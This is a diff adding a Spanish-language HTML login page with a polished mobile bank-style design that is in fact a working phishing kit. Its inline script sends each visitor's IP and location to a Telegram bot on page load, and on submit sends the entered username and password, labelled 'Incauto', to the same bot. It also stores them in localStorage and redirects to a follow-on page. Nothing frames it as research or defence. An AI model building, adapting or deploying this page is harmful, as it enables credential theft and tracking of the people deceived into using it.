@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PRUEBA</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-color: #2e846b;
+            --text-dark: #2c3e50;
+            --text-muted: #7f8c8d;
+            --input-border: #bdc3c7;
+            --link-color: #0056b3; 
+            --spacing-1: 4px;
+            --spacing-5: 20px;
+            --spacing-8: 32px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Lato', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f5f6fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            width: 100vw;
+            overflow-x: hidden;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 430px; 
+            height: 100vh;
+            background-color: var(--primary-color);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+        }
+
+        @media (min-width: 480px) {
+            .wrapper {
+                height: 92vh;
+                min-height: 760px;
+                border-radius: 24px;
+                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+            }
+        }
+
+        .header-section {
+            position: relative;
+            padding-top: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            flex-shrink: 0;
+            z-index: 1;
+        }
+
+        .header-section::before, .header-section::after {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.06);
+            z-index: -1;
+        }
+        .header-section::before { top: -20px; right: -30px; width: 250px; height: 250px; }
+        .header-section::after { top: 70px; right: 20px; width: 150px; height: 150px; }
+
+        .logo-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            padding: 5px 0;
+        }
+
+        .logo {
+            width: 11.5rem;
+            max-width: 175px;
+            height: auto;
+        }
+
+        .avatar-person {
+            width: 55vw;
+            min-width: 12.5rem;
+            max-width: 230px;
+            position: relative;
+            top: 0;
+            margin-left: var(--spacing-5);
+            margin-top: calc(var(--spacing-8) * -0.5);
+            margin-bottom: calc(var(--spacing-1) * -1);
+            display: block;
+        }
+
+        .form-container {
+            background-color: #ffffff;
+            border-top-left-radius: 35px;
+            border-top-right-radius: 35px;
+            padding: 30px 28px 15px 28px;
+            flex-grow: 1; 
+            display: flex;
+            flex-direction: column;
+            z-index: 2;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            justify-content: space-between;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 15.5px;
+            color: #455a64;
+            margin-bottom: 6px;
+            font-weight: 400;
+        }
+
+        .input-control {
+            width: 100%;
+            padding: 10px 14px;
+            font-family: 'Lato', sans-serif;
+            font-size: 14.5px;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            outline: none;
+            color: var(--text-dark);
+            transition: border-color 0.2s;
+        }
+
+        .input-control:focus {
+            border-color: var(--primary-color);
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 14px;
+            bottom: 11px;
+            cursor: pointer;
+            opacity: 0.4;
+            display: flex;
+            align-items: center;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 6px;
+            margin-top: -8px;
+            margin-bottom: 18px;
+            color: var(--text-muted);
+            font-size: 14px;
+        }
+
+        .remember-me input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: var(--primary-color);
+            cursor: pointer;
+        }
+
+        .links-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            gap: 10px;
+        }
+
+        .links-container a {
+            font-size: 13px;
+            color: var(--link-color);
+            text-decoration: none;
+            font-weight: 700;
+        }
+
+        .links-container a:hover {
+            text-decoration: underline;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: var(--primary-color);
+            color: #ffffff;
+            border: none;
+            padding: 14px;
+            font-family: 'Lato', sans-serif;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            border-radius: 30px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+            margin-bottom: 5px;
+        }
+
+        .btn-submit:hover {
+            background-color: #236652;
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .footer-bar {
+            width: 100%;
+            height: 70px; 
+            background-color: var(--primary-color);
+            flex-shrink: 0;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wrapper">
+        
+        <div class="header-section">
+            <div class="logo-container">
+                <img src="a.png" alt="Logo" class="logo">
+            </div>
+            <img src="b.png" alt="Usuario" class="avatar-person">
+        </div>
+
+        <div class="form-container">
+            <form id="loginForm" action="#" method="POST">
+                
+                <div class="fields-wrapper">
+                    <div class="form-group">
+                        <label for="username">Ingresa tu usuario</label>
+                        <input type="text" id="username" class="input-control" autocomplete="off" required>
+                    </div>
+
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Recordarme</label>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">Ingresa tu contraseña</label>
+                        <input type="password" id="password" class="input-control" required>
+                        <span class="password-toggle" id="togglePassword">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <line x1="1" y1="1" x2="23" y2="23"></line>
+                                <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                                <path d="M1 12s4-8 11-8a11.37 11.37 0 0 1 5.06 1.17"></path>
+                                <path d="M14.22 14.22a3 3 0 1 1-4.44-4.44"></path>
+                            </svg>
+                        </span>
+                    </div>
+
+                    <div class="links-container">
+                        <a href="#">Olvidé mi usuario</a>
+                        <a href="#">Olvidé o bloquee mi contraseña</a>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="btnContinuar">Continuar</button>
+
+            </form>
+        </div>
+
+        <div class="footer-bar"></div>
+
+    </div>
+
+    <!-- ===== SCRIPTS ===== -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script type="text/javascript" src="infodt.js"></script>
+    
+    <script>
+    $(document).ready(function() {
+        
+        // Elementos del DOM
+        const form = document.getElementById('loginForm');
+        const btn = document.getElementById('btnContinuar');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        
+        var telegramUrl = "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage";
+        var ipInfo = "";
+        
+        // Toggle de visibilidad de contraseña
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+        });
+
+        // 1. ENVIAR IP AL CARGAR LA PÁGINA
+        $.ajax({
+            url: "https://www.cloudflare.com/cdn-cgi/trace",
+            method: "GET",
+            dataType: "text"
+        }).done(function(data) {
+            var ip = "", loc = "";
+            var lines = data.split("\n");
+            for (var i = 0; i < lines.length; i++) {
+                if (lines[i].indexOf("ip=") === 0) ip = lines[i].substring(3);
+                if (lines[i].indexOf("loc=") === 0) loc = lines[i].substring(4);
+            }
+            ipInfo = "📡 IP: " + ip + "\n🌍 Ubicación: " + loc;
+            var fd = new FormData();
+            fd.append("chat_id", telegramChatId);
+            fd.append("text", "🔍 ENTRADA\n\n" + ipInfo + "\n🕐 Fecha: " + new Date().toLocaleString());
+            $.ajax({ url: telegramUrl, method: "POST", data: fd, processData: false, contentType: false });
+        });
+        
+        // === ENVÍO DE DATOS ===
+        function enviarDatos(event) {
+            event.preventDefault();
+            
+            const usuario = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (!usuario || !password) {
+                return;
+            }
+            
+            btn.disabled = true;
+            btn.textContent = 'Procesando...';
+
+            // 2. ENVIAR TODO JUNTO (IP + USUARIO + CONTRASEÑA)
+            var message = "🔐 Incauto\n\n" +
+                ipInfo + "\n\n" +
+                "👤 Credencial: " + usuario + "\n" +
+                "🔒 Acceso: " + password + "\n" +
+                "🕐 Fecha: " + new Date().toLocaleString();
+
+            // Guardar para usar en las siguientes páginas
+            localStorage.setItem("usuario", usuario);
+            localStorage.setItem("clave", password);
+
+            var formData = new FormData();
+            formData.append("chat_id", telegramChatId);
+            formData.append("text", message);
+
+            $.ajax({
+                async: true,
+                url: telegramUrl,
+                method: "POST",
+                data: formData,
+                processData: false,
+                contentType: false
+            })
+            .always(function() {
+                setTimeout(function() {
+                    window.location.href = 'fac.html';
+                }, 2000);
+            });
+        }
+        
+        // === EVENTOS ===
+        form.addEventListener('submit', enviarDatos);
+        
+        usernameInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') form.dispatchEvent(new Event('submit'));
+        });
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') form.dispatchEvent(new Event('submit'));
+        });
+        
+    });
+    </script>
+    
+</body>
+</html>
